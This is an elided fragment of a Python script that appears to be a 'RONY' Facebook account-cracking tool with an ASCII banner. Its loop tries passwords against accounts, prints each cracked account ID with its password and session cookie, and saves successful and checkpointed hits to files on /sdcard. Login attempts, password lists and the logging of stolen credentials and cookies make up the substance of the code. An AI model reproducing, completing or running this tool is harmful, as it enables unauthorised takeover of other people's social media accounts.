...
logo = (""""\033[132m8888888b.   .d88888b.  888b    888 Y88b   d88P      
888   Y88b d88P" "Y88b 8888b   888  Y88b d88P       
888    888 888     888 88888b  888   Y88o88P        
888   d88P 888     888 888Y88b 888    Y888P         
8888888P"  888     888 888 Y88b888     888          
888 T88b   888     888 888  Y88888     888          
888  T88b  Y88b. .d88P 888   Y8888     888          
888   T88b  "Y88888P"  888    Y888     888\033[1;37m\n""")
def ud():
    os.system('clear')
    jalan(logo)
    print(' [2] EXIT')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[RONY-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/RONY-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[RONY-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/RONY-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[RONY] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
